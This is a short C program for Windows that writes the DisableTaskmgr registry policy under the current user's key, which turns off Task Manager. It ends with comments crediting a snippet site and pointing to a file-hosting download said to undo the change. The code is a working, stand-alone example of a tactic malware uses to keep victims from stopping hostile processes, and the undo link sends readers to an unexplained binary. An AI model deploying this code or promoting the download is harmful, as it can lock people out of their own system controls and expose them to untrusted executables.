#include <windows.h>

int main()
{
  DWORD dwVal = 1;

  HKEY hKey;
  RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
  RegSetValueEx (hKey, "DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&dwVal , sizeof(DWORD));
  RegCloseKey(hKey);
  return 0;
}

// http://hawkee.com/snippet/5756/ 
// To redo changes download this file: http://www.mediafire.com/download.php?tkjoxmj3mmy
